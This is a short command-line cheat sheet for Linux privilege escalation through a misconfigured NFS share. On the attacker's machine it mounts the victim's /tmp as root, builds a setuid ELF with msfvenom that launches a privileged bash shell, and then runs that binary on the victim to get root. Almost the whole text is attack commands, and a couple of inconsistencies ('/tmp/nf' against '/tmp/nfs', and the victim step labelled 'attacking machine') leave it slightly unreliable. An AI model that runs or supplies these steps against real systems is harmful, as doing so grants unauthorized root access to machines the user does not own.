### **Ona kali**
```console
sudo su
mkdir /tmp/nf
mount -o rw,vers=2 {LHOST}:/tmp /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
```
### **On attacking machine**
```console
/tmp/shell.elf
```
